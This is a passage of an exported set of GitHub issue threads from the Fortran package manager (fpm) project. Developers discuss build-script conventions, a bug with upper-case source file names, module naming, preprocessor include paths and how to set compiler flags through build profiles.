                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:22:17+00:00",
                    "text": "In your case, I'd recommend using a wrapper script to make doing things properly a bit easier. Something like\n#!/bin/bash\n\nexpected_archive=$1\n\nmake all F95=$FC\ncp where/your/*.mod $BUILD_DIR\ncp where/your/archive.a $expected_archive\nbecause, as you've noticed, the build directory will be different when included as a dependency. If you can, you should try and make use of the FFLAGS environment variable as well, so in the future, projects using yours can try out different compiler flags."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 20:09:30+00:00",
                    "text": "That might work, but what would I use as the argument to the script ($1) ?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 22:01:13+00:00",
                    "text": "fpm calls that script with the appropriate argument. So assuming your script is called build_script.sh, your fpm.toml would look like\n...\n[library]\nsource-dir = \"src\" # presumably\nbuild_script = \"build_script.sh\"\n...\nand fpm will call your script (effectively) like\nFC=gfortran FFLAGS=\"-some -flags ...\" BUILD_DIR=\"wherever/fpm/decides\" INCLUDE_DIRS=\"build/thing1 build/package2 ...\" build_script.sh some/where/libpackage.a"
                },
                {
                    "user": "certik",
                    "date": "2020-07-14 22:25:11+00:00",
                    "text": "@everythingfunctional why not pass everything as environment variables?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 23:05:22+00:00",
                    "text": "I'm not sure I have a thoroughly compelling answer, but my thinking is along the lines of the following:\n\nWe should conform to common practices in existing build systems\nCommon build commands (or at least the ones I'm used to) are of the form build_script what_I_would_like_built\nA common practice for overriding build parameters is via environment variables\n\nI'd agree it's not the most elegant and consistent design, but if our goal is to make migrating to fpm easier, conforming to existing practices is probably the way to go."
                },
                {
                    "user": "certik",
                    "date": "2020-07-14 23:23:38+00:00",
                    "text": "I would suggest to follow Cargo's approach, and not invent our own conventions.\n\u2026\nOn Tue, Jul 14, 2020, at 5:05 PM, Brad Richardson wrote:\n\n\n I'm not sure I have a thoroughly compelling answer, but my thinking is\n along the lines of the following:\n\n  * We should conform to common practices in existing build systems\n  * Common build commands (or at least the ones I'm used to) are of the\n form `build_script what_I_would_like_built`\n  * A common practice for overriding build parameters is via environment\n variables\n I'd agree it's not the most elegant and consistent design, but if our\n goal is to make migrating to fpm easier, conforming to existing\n practices is probably the way to go.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#118 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWEBAUPZFHBQJ6YSGPTR3TQD7ANCNFSM4OW6ADFA>."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-15 07:47:26+00:00",
                    "text": "some/where/libpackage.a\n\nAnd what about the .mod files?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 18:34:25+00:00",
                    "text": "The mod files need to go in the same place."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 18:41:02+00:00",
                    "text": "I would suggest to follow Cargo's approach, and not invent our own conventions.\n\u2026\nOn Tue, Jul 14, 2020, at 5:05 PM, Brad Richardson wrote: I'm not sure I have a thoroughly compelling answer, but my thinking is along the lines of the following: * We should conform to common practices in existing build systems * Common build commands (or at least the ones I'm used to) are of the form build_script what_I_would_like_built * A common practice for overriding build parameters is via environment variables I'd agree it's not the most elegant and consistent design, but if our goal is to make migrating to fpm easier, conforming to existing practices is probably the way to go. \u2014 You are receiving this because you commented. Reply to this email directly, view it on GitHub <#118 (comment)>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AAAFAWEBAUPZFHBQJ6YSGPTR3TQD7ANCNFSM4OW6ADFA.\n\nI think Cargo's approach is really good, and we should strive for it. In the mean time, we don't yet support using Fortran as a build script, and their approach doesn't support any other custom (or existing) build scripts, like we would (maybe) like to support."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 20:03:47+00:00",
                    "text": "Cargo requires to write Rust code for the script. We should allow other scripts such as Bash or Makefile, as we discussed. But they should be treated exactly the same as the (future) Fortran script (if we decide to allow that, or just require Bash or Makefile).\nThe API is described here:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html\nThe script is run as is (with no arguments) and everything is passed using environment variables:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html#inputs-to-the-build-script\nAnd the outputs are communicated by printing to stdout using the \"cargo:...\" encoding:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html#outputs-of-the-build-script\nCan we do the same for fpm?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 21:06:55+00:00",
                    "text": "I think we should move towards Cargo's API design. Then the communication mechanism can be the same for any build script; inputs as environment variables, outputs as prefixed lines on stdout.\nThere is a subtle distinction between Bash, Makefile, and Fortran build scripts though that they aren't treated exactly the same. Fortran must be compiled first, potentially with some dependencies if we're following Cargo's design. Bash scripts are executed directly, and Makefiles must be executed with make.\nI also don't know that this design will make it any easier to transition existing projects to fpm. There is virtually no chance that an existing build system will \"just work\" with this design, but that chance was probably pretty small with my design anyway."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 21:16:43+00:00",
                    "text": "Perfect, thanks. Yes, I agree it won't make it easier for other projects to port, but by using the same design as Rust, at least they don't have to update their build scripts once they port (currently they will have to update the makefile / bash script after we change the API).\nUsing Fortran as a script sound weird at first, but make sense from a multiplatform perspective, as it would run natively on Windows and other platforms, while Bash typically does not run natively, but requires a linux subsystem on Windows. I think that's why Cargo chose Rust as the script."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-15 21:39:52+00:00",
                    "text": "I think that there is a very simple solution for projects that compile with pre-existing makefiles: We just need to define two environment variables.\n\nBUILD_DIR is already defined, and tells where to put the .mod and .a files within the original project. This would either be in the directory build/gfortran_debug/project if you were simply building the project by itself, or in build/dependencies/gfortran_debug/project if you were installing it as a dependency.\nINSTALL_DIR, which is where the contents of BUILD_DIR get copied when the project is installed as a dependency. This corresponds to BUILD_DIR/../../gfortran_debug/project.\n\nIn practice, the makefile would compile all the .mod and .a files in BUILD_DIR, and only if INSTALL_DIR is defined would they then get copied to INSTALL_DIR."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 23:23:58+00:00",
                    "text": "Something like that. Here is the list of environment variables that Cargo defines:\nhttps://doc.rust-lang.org/cargo/reference/environment-variables.html#environment-variables-cargo-sets-for-build-scripts\nnote that most are prefixed with CARGO_, but some are not. I suspect the ones that are not are due to historical reasons. I very strongly suggest we prefix all our environment variables by FPM_, so it would be FPM_BUILD_DIR and FPM_INSTALL_DIR. The reason is that it is very easy to make complex 3rd party build systems fail if you define an environment variable with a common name like BUILD_DIR or INSTALL_DIR, because the customized 3rd party build system can easily do something different if this variable is defined. By prefixing all variables, we ensure that our environment variables do not clash with user defined variables. It's a good habit to do that, not to pollute the environment namespace."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 23:55:50+00:00",
                    "text": "A quick note, BUILD_DIR is always build/<compiler>_<debug_or_release>/project, whether it's building your project standalone or as a dependency. So when building your project as a dependency, the BUILD_DIR is not within your project's directory. Thus, no need for the INSTALL_DIR variable."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-16 08:48:18+00:00",
                    "text": "Thanks for all the help: I turns out that I was misinterpreting how BUILD_DIR was being set for stand-alone projects and dependencies. (I also made a dumb choice to hardcode the variable build/gfortran_debug/myproject in the makefile for the standalone project). Using\nbuild-script = \"make all F95=$FC LIBPATH=$BUILD_DIR MODPATH=$BUILD_DIR\"\n\nnow works for both cases :) The only thing I need to do to make this work is to be able to link to system-wide libraries.\nOne final question: how do I change debug to release ?"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-29 20:17:34+00:00",
                    "text": "Could the Makefile of stdlib be already used to compile stdlib with fpm?"
                }
            ]
        },
        {
            "number": 117,
            "user": "everythingfunctional",
            "date": "2020-07-08 18:25:48+00:00",
            "title": "Fix bug with case in program source file name.",
            "text": "Fix #116\nI guess up to now nobody had tried using uppercase in the name of their program source file. This fixes it.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-07-11 21:47:28+00:00",
                    "text": "Nice timing. This was vexing me and I had just found the work-around and was going to report the bug.  Guess it is time to update my copy of fpm(1). That raises the question of whether there should be a line to put in the input files indicating what version of fpm(1) was tested with (which might produce a warning) and what version is at (at least) required? \\\nI would change the pathname back to containing uppercase letters but I am  afraid it would confuse anyone attempting to use the repository with an older version of fpm(1), for example.\nI was working on setting up the following for use with fpm(1) when I hit the problem:\n[dependencies]\n M_process      = { git = \"https://github.com/urbanjost/M_process.git\" }\n\nC SUPPORT?\nI see others have mentioned at least supporting C wrappers for use with the intrinsic module ISO_C_BINDING; but unless that is imminent does anyone have an example using a custom build script that does that? I have a bunch of stuff (M_system, M_draw, M_ncurses, ... that has C wrappers or bindings that I wanted to try with fpm(1) but that is a show stopper; whereas STACK has good multi-language support, etc..\nREVIEW?\nI have a bunch of stuff I was trying with fpm(1) so if anyone has time to comment on how I have used (abused?) it so far, M_process and M_time are about done as far as what I was planning on.\nPRETTY PICTURE WANTED?\nAny kind of an image to place on pages that support fpm(1)? A glowing box with light coming out of it with a big \"F\" above the box?  Anyone feeling artistic?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-13 16:05:55+00:00",
                    "text": "@urbanjost , I have an example wrapping a C library here.\nIf I can find some free time I'll try and give your project a look."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-13 18:45:36+00:00",
                    "text": "@certik can you please review this or approve without review? This fix allows some users to build their packages."
                },
                {
                    "user": "certik",
                    "date": "2020-07-13 20:06:53+00:00",
                    "text": "This looks good, the fix is simple and tests pass."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-07-16 01:39:47+00:00",
                    "text": "The C wrapper and Makefile and fpm example project file are great. It was not clear from the documentation I had found so far how to do that. I wil see how far I get in the next few days.  Not knowing how to do this was preventing me from going much further with my fpm experiments."
                }
            ]
        },
        {
            "number": 116,
            "user": "lauvergn",
            "date": "2020-07-08 12:03:45+00:00",
            "title": "fortran main name file",
            "text": "I found an issue related to the name of the main fortran file.\nWhen main.f90 is in the app directory, the executable is created nicely. Part of the fpm.toml file is:\n\n[[executable]]\nname=\"TEST_dnS.x\"\nsource-dir=\"app\"\nmain=\"main.f90\"\n\nHowever, when, I'm using another name (TEST_dnS.f90)\n\n[[executable]]\nname=\"TEST_dnS.x\"\nsource-dir=\"app\"\nmain=\"TEST_dnS.f90\"\n\nI've got some errors:\n\nfpm: Error when running Shake build system:\nat want, called at src/Build.hs:114:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n\nDepends on: build/gfortran_debug/app/TEST_dnS.x\nat need, called at src/Build.hs:120:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nDepends on: build/gfortran_debug/app/test_dns.o\nat &%>, called at src/Build.hs:137:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nDepends on: build/gfortran_debug/app/test_dns.o build/gfortran_debug/app/test_dns.mod\nat undefined, called at src/Build.hs:142:25 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nat error, called at libraries/base/GHC/Err.hs:78:14 in base:GHC.Err\nRaised the exception:\nPrelude.undefined",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:16:36+00:00",
                    "text": "That looks to me like it's expecting a test_dns module. Perhaps there is a uppercase/lowercase mismatch in the file name? Maybe try deleting the build directory to start fresh?\nI can maybe try and dig deeper later today if none of those work."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 15:24:22+00:00",
                    "text": "Perhaps there is a uppercase/lowercase mismatch in the file name?\n\nI thought about that too, but it is not that.\n\nMaybe try deleting the build directory to start fresh?\n\nI've tried that as well (several times!!)"
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 16:33:34+00:00",
                    "text": "I can maybe try and dig deeper later today if none of those work.\n\nThanks, you can get the full test here:\nhttps://github.com/lauvergn/test-fpm"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 18:18:53+00:00",
                    "text": "Figured out the problem. The build process for the executable isn't handling upper-case vs lower-case correctly for the name of the source file vs the name of the object file. I'll get a fix put together shortly."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 18:21:15+00:00",
                    "text": "Figured out the problem. The build process for the executable isn't handling upper-case vs lower-case correctly for the name of the source file vs the name of the object file. I'll get a fix put together shortly.\n\nThanks"
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-09 12:58:04+00:00",
                    "text": "Thnanks"
                }
            ]
        },
        {
            "number": 115,
            "user": "lauvergn",
            "date": "2020-07-08 07:50:32+00:00",
            "title": "Moving a fpm package structure to another one",
            "text": "In a way, it is not an issue about the actual fpm tool, but something which might be annoying in the future.\nLet assume, you have package with one or several libraries, so the fpm tree is:\n\nsrc/math_constants/\nsrc/phys_constants/\n\nSo a fortran files is math_constants_xxx.f90 and its corresponding module name is math_constants_xxx.\nNow, if one wants to move this structure to a more complex one (or it is taken from another package):\n\nsrc/Util/math_constants/\nsrc/Util/phys_constants/\n\nThen it means, you have to change:\n\nall module names inside the library and also in the other part of the code (much more complex, although with some ide it is doable)\n\nI think fpm needs some tools to perform such features.\nalias gardhor",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-08 15:11:00+00:00",
                    "text": "Yes, we discussed this exact issue in the past and we all agree that fpm should be able to fix up your code when you move files around."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:13:28+00:00",
                    "text": "Yeah, I could definitely see that being a desired refactoring, and it certainly would be a chore to do manually.\nSolving this properly will involve a more complete Fortran parser than we've needed so far. This and other desired features are making it pretty clear that we're going to need one.\nSome thoughts on what the user interface might look like:\n\nfpm move <old-name> <new-name>\nfpm rename <old-name> <new-name>\nMaybe have a separate tool?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-08 15:19:00+00:00",
                    "text": "Actually the API I was thinking of would be:\n\nfpm fix_module_names or something like that, and it would go into each file and ensure the module name corresponds to the path.\n\nBut I can see that fpm move would also be useful to fix all use statements.\nThese are all things that we should do in the Fortran version of fpm."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-08 15:32:49+00:00",
                    "text": "Just an idea. Could it be part of fpm build? Example:\n$ fpm build\n...\n...\nfpm error: I found inconsistent module name in src/a/b/util.f90. Do you want me to fix it? [y/n/a]\n\nSo an error would trigger a prompt from user, which could be overriden with a flag like fpm build --fix-all or similar.\nLike with many other software things, it's a design compromise between many small commands versus fewer more general commands. I don't know what's nicer for the average user."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 15:44:12+00:00",
                    "text": "fpm fix_module_names or something like that, and it would go into each file and ensure the module name corresponds to the path.\n\n\nA tool like that will be great also to move (or to help moving) a none-fpm package to a fpm one."
                },
                {
                    "user": "certik",
                    "date": "2020-07-08 15:47:03+00:00",
                    "text": "@milancurcic and @lauvergn yes to both. For fpm build, perhaps with an option fpm build -i (as in interactive), since I think the build should not wait for user input by default, as it would stall on CIs."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:49:51+00:00",
                    "text": "Yep, I agree. Both of those would also be useful additions. To the extent possible fpm should provide meaningful error messages and help the user fix any problems related to the conventions/restrictions that it imposes."
                }
            ]
        },
        {
            "number": 114,
            "user": "smeskos",
            "date": "2020-07-07 13:05:05+00:00",
            "title": "module naming issue",
            "text": "I found out after a lot of trouble that I couldn't build my project because I had all the modules files in src/ in the form mod_name.f90, when I renamed all files to m_name.f90 and the modules to module m_name respectively, it recognized them all and built successfully.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 14:06:09+00:00",
                    "text": "Right, it's an important detail. :)\nI'm curious, did you read the Packaging Guide beforehand? If not, perhaps we need to link to it more prominently from the README. Currently it's at the bottom. If you did read it, was any part of the guide confusing?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:11:10+00:00",
                    "text": "Yes, I read it. Let me rephrase, the problem was not with the same name, I already had my files and modules named the same. The problem is with the particular style: mod_name.f90 and module mod_name. It couldn't recognize modules starting with the prefix mod_."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 15:17:44+00:00",
                    "text": "Okay, I see. I don't think that should be the case. @everythingfunctional can you confirm this behavior? Is it expected?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:34:49+00:00",
                    "text": "We discussed the naming convention in #39 a bit.\nI think the above seems to be a bug either way, but in general, we were thinking that we could simply name the modules by a name, and then fpm would enforce the directory structure in the name. So if you are calling your module as mod_name, and put it into src/a/b/mod_name.f90, then fpm would enforce that the module is called a_b_mod_name, but the filename is just mod_name.f90. That way we are essentially allowing to have namespaces."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:36:38+00:00",
                    "text": "The other issue related to this is that all modules should probably be prefixed by the name of the package, again, enforced by fpm. That way when you depend on it in other dependencies, the modules do not clash. So src/mymod.f90 would start with module mypackage_mymod."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:41:29+00:00",
                    "text": "CCing @everythingfunctional, it's important that we get this right soon.\nI think the way we could do it is to implement what I described above by default and fpm would give an error if the modules are not named correctly. But users could override this in fpm.toml, if they really do not want to use this convention, say with module_naming_convention = false or something like that.\nFor example, in stdlib we already are naming modules like stdlib_experimental_io. After we move stdlib to use fpm, we would have a directory structure: src/experimental/io.f90, and since the package is called stdlib and since io.f90 is in the experimental directory, the file would start with module stdlib_experimental_io (as it already does). After the module graduates to stable, we move it to src/io.f90 and it would start with module stdlib_io."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 15:50:48+00:00",
                    "text": "The other issue related to this is that all modules should probably be prefixed by the name of the package, again, enforced by fpm. That way when you depend on it in other dependencies, the modules do not clash. So src/mymod.f90 would start with module mypackage_mymod.\n\nI agree that we need some solution to prevent name clash with dependencies, but this solution doesn't look like a good one to me. Consider datetime-fortran, which has the package name \"datetime\", and one module that contains a derived type datetime. How do you suggest I name the module?\nThe way it's named currently (datetime_module), this would require that I rename the module source file to src/module.f90. It works but it's very awkward to me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-07 16:52:55+00:00",
                    "text": "If  mod_name as the name of a module was not working but m_name was, that's a bug. I'm not sure what the problem is offhand.\nI think enforcing modules in a library be prefixed by the project name is probably overkill. If namespacing is needed, we have a way to do that. Just put everything in a folder with the name of the library. I'm not sure having that be the default is necessary."
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 20:02:58+00:00",
                    "text": "I tried to replicate my issue with a smaller test case, and I couldn't, this time, fpm worked fine with modules with prefix mod_.  I also tried https://github.com/wavebitscientific/functional-fortran from  @milancurcic (since his modules are with mod_) and it also worked fine. I can only guess that I am missing something in my main project. I am going to look into it and will come back when I figure it out. Sorry for this false alarm. Regardless, your comments were very interesting and helpful. Thank you all!"
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 20:28:42+00:00",
                    "text": "@smeskos I am glad it works!\n@everythingfunctional I don't know. We should discuss it. I feel module names without prefixes should be reserved for the main (user) application. Libraries should hide their modules behind a prefix. That is the common convention in C, which has the same problem (all functions being global). So if we agree that is a good convention, then we should enforce it (users can opt-out)."
                }
            ]
        },
        {
            "number": 113,
            "user": "smeskos",
            "date": "2020-07-07 12:57:28+00:00",
            "title": "preprocessor directives",
            "text": "I am trying to build a simple logging library I wrote some time ago. In order to get file names and current line number I use a small preprocessor file: macros.h that only contains:\n#ifndef FL\n#define FL __FILE__\n#endif\n\n#ifndef LN\n#define LN __LINE__\n#endif\nand I include it at the beginning of the file I want to use it like #include \"macros.h\"\nI get this error when I am trying to build with fpm:\nExit code: 1\nStderr:\ntest/main.f90:1:2:\n\n    1 | #include \"marcos.h\"\n      |  1\nWarning: Illegal preprocessor directive\ntest/main.f90:8:20:\n\n    8 |     call log%info(FL, LN, 'Passed')\n      |                    1\nError: Symbol \u2018fl\u2019 at (1) has no IMPLICIT type\ncompilation terminated due to -fmax-errors=1.\nNote that this is with main.f90\nWhen I changed the name to main.F90and the fpm.toml file accordingly:\n[[test]]\nname=\"runTests\"\nsource-dir=\"test\"\nmain=\"main.F90\"\nThen I got this error:\nExit code: 1\nStderr:\ntest/main.F90:2:2:\n\n    2 | program test\n      |  1~~~~~~~~~\nFatal Error: marcos.h: No such file or directory\ncompilation terminated.\nAny suggestions of what I may be doing wrong?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 14:08:37+00:00",
                    "text": "Is your include file macros.h or marcos.h? Currently your f90 file tries to include marcos.h but perhaps the file is called macros.h."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 14:30:27+00:00",
                    "text": "As discussed in #78, the .f90 files should also be run through the pre-processor, perhaps no by default (for speed reasons), but if you enable it in the fpm.toml."
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:06:36+00:00",
                    "text": "@milancurcic You are correct that was a typo, but the problem persists after correcting it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 15:17:42+00:00",
                    "text": "Hi @smeskos, is the macros.h file in the same folder as the .f90 files that include it?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:32:22+00:00",
                    "text": "@LKedward right, that was the problem. I had this in src/ but I wanted to use it in test/. Thank you!!"
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 16:27:33+00:00",
                    "text": "Glad that fixed it!\nWe may potentially need an option to manually specify an include path or have a standard include folder (include/) which contains text inclusions; consider the case if you needed to use macros.h from both src/ and test/"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 19:46:06+00:00",
                    "text": "Thank you again. I am closing this."
                }
            ]
        },
        {
            "number": 112,
            "user": "smeskos",
            "date": "2020-07-07 12:39:16+00:00",
            "title": "Managing flags",
            "text": "Is it possible to add/remove flags and reset back to defaults if needed?\nIs there an option to display flags (before building)? (eg. fpm show flags)",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-07 14:31:37+00:00",
                    "text": "@smeskos what flags do you have in mind? Compiler flags?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 14:58:42+00:00",
                    "text": "Yes I mean compiler flangs."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:10:20+00:00",
                    "text": "I don't think it's possible currently, but we need to have it.\nProbably fpm.toml should allow to set flags for specific compilers per file.\nHowever, even more important is to extract common flags into general settings that work across compilers.\nWhat flags would you like to set @smeskos ?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:22:19+00:00",
                    "text": "I would like to set -cpp, -Wconversion and -std=f2018.  But most importantly to suppress warnings (per case), eg. many times when I am still testing something and is under-development I set -Wno-uninitialized-variables and others as well, the reason is that I don't want to pollute the output with dozens non-relevant warnings."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 15:28:07+00:00",
                    "text": "+1 for customising compile flags for debug/release.\nAlso need an option for specifying link flags for linking against external libs like BLAS etc."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:29:00+00:00",
                    "text": "Ok, so let's take it on a case by case:\n\n\n-cpp should be done in a general manner as discussed in #78.\n\n\n-std=f2018 should also be done in a general manner (that works with all compilers), probably an fpm.toml setting such as \"standard = F2018\" or something like that.\n\n\nThe -Wconversion should be enabled by default, together with all other common warnings\n\n\n-Wno-uninitialized-variables this is the one where we need to allow to set a specific option per file. It could also be done from a command line.\n\n\nSo we need a general solution, but the most common use cases (such as 1., 2. and 3. above) should be abstracted out and fpm should know how to deal with those."
                },
                {
                    "user": "jerryd",
                    "date": "2020-08-11 23:39:59+00:00",
                    "text": "I need to include things like this on the compiler command line.  Right now this is a blocker for me.  Is it possible to set FC to a script to wrap around this:\n$(pkgconf --cflags --libs gtk-3-fortran)\nAs an example:\ngfortran -c $(pkgconf --cflags --libs gtk-3-fortran) mystuff.f90\nBeing able to invoke pkgconf is also important for many other complex libraries."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-08-12 22:51:07+00:00",
                    "text": "Although it would be preferable for fpm to do this more generically, I ran into similar issues and you can specify something like\nbuild-script = \"fpm.mk\"\nand then put a Makefile in fpm.mk.  I had to use that to build a library that contained dozens of C files and where I wanted the output to include a *.a static library instead of *.o files and needed X11 to be loaded in the executables, for example. There are some environment variables defined by fpm(1) as described in the fpm documentation that are helpful in placing the output files in the correct directories, as they go in different places when you use the --release option; for example.  M_system and M_draw have fpm.mk files, for example\nhttps://github.com/urbanjost/M_system.git\nhttps://github.com/urbanjost/M_draw.git\nAlthough I apparently did not follow the toml standard in my fpm.toml files (although they work with fpm(1)) which I am hopefully going to correct soon. Maybe not the ideal long-term solution, but works today."
                },
                {
                    "user": "jerryd",
                    "date": "2020-08-14 16:53:20+00:00",
                    "text": "It seems the simplest way to do this would to have FPM check for an environment variable such as $FFLAGS and just substitute those in or use it to override the default flags.  I have not looked at the FPM source code so I 'imagine' this would be straight forward to do"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-08 19:07:08+00:00",
                    "text": "Cargo uses profiles to define the compilation arguments: https://doc.rust-lang.org/cargo/reference/profiles.html\nWe could use a similar scheme to define arguments in fpm and make it extensible for additional compilation profiles (like coverage).\nJust as an example how the current release build mode could be expressed:\n[profile.release]\nfast-math = true\noptimization = 3\ndebug = false\nstandard = \"2008\"\nlto = false\npic = true\ncompile-args.gnu = [\"-funroll-loops\"]  # compiler id required for specifying arguments?\nThe command line could allow a --profile key to reference a defined profile, with debug or development being the default and release being a special profile selected by the --release argument."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 01:06:39+00:00",
                    "text": "Yes. The package ideally  has a self-contained definition file so when someone uses it as an external dependency it would build automatically so this seems like a good direction, but harder for Fortran than most other languages to implement.\nUsing switches on the command line is handy for a developer or someone not planning on distributing their package but is problematic otherwise, especially for anything that is intended to be used automatically as an external dependency by others.\nMulti-compiler support becomes difficult unless the keywords are something like a general name like \"coarray\" or \"X11\" and there are built-in defaults for how to implement that for each compiler, which quickly gets to be a maintenance problem past a few basic options.  Just wondering if the configuration files should be able to be in separate files so they can be shared and reused easily. I would not say that should be mandatory; but an option.\nSo I am trying to picture when I am using a number of external dependencies and maybe a math library is using coarrays and a graphics package is using X11 libraries and a TUI interface is using ncurses. It seems like external \"system\" load options should be inherited by the apps by default for loading?  It gets complicated because there are potentially many compilers with different options.  It would be nice if we had a generic load script and compile script for Fortran that was standardized, but right now if I just had something that let me say for \"ifort\" add these load options, and for \"gfortran\", \"f90\", ... add these it would eliminate my need for a fpm.mk file for several packages, which would be nice.\nI could live with the top package having to specify all the options but it would require any external package that depends on \"system\" libraries to always require manual editing of the main project manifest.\nSo I think there are still issues but being able to specify options in the manifest file seems the right direction; and being to distinguish between optional and required options might allow \"required\" options to be inherited by the top package.\nMaybe just like you have to add a line in your manifest for a dependency the dependency might be able to specify options as well?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-09 08:54:42+00:00",
                    "text": "We could use a similar scheme to define arguments in fpm and make it extensible for additional compilation profiles (like coverage)\n\nYes, this is very much how I envisaged the problem to be solved. This allows us to support multiple compilers and handle flag compatibility between dependencies but without restricting the general user. I think this is the solution we should pursue for managing compilers and flags. Importantly this will allow us to get something general and flexible working; any issues surrounding particular flags and compilers can then be addressed on a case-by-case basis.\n\nIn addition to \"coverage\" the other profile I use often would, perhaps confusingly, be \"profile\" for performance profiling."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-14 15:39:40+00:00",
                    "text": "An alternative proposal, we already have the build table, so we could put it in here:\n[build.config.release]\noptimization = 3\ndebug = false\n\n[build.config.debug-optimized]\noptimization = 2\ndebug = true\n\n[build.config.debug]\noptimization = 0\ndebug = true\n\n[build.config.coverage]\noptimization = 0\ndebug = true\n\n[build.config.profile]\noptimization = 2\ndebug = false\nThe idea would be to create a table in build containing our compilation profiles. This is the scope I'm envisioning for now:\n\nthe profiles can have any name, fpm allows to select them at runtime\nfpm defines release and debug profiles for GCC (this set can be extended in future)\nany dependency not defining a named profile will inherit the profile from the dependent\ninheritance of profile options is defined on per option basis (optimization is handled different than fast-math, and so forth)\ncompiler-specific options should be discussed separately (see #223)\n\nI'm also looking for a better synonym of profile; config, option or setting would be possible. Any suggestions or preferences?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 00:05:10+00:00",
                    "text": "Just as an example how the current release build mode could be expressed:\n[profile.release]\nfast-math = true\noptimization = 3\ndebug = false\nstandard = \"2008\"\nlto = false\npic = true\ncompile-args.gnu = [\"-funroll-loops\"]  # compiler id required for specifying arguments?\n\nI am not sure if the language standard makes sense as part of a profile."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 07:27:29+00:00",
                    "text": "I am not sure if the language standard makes sense as part of a profile.\n\nThere should be some way to specify it, in most projects I usually set the standard flag for debug builds and leave it out in the release, but specifying it globally in the [build] table would work as well."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-27 11:19:02+00:00",
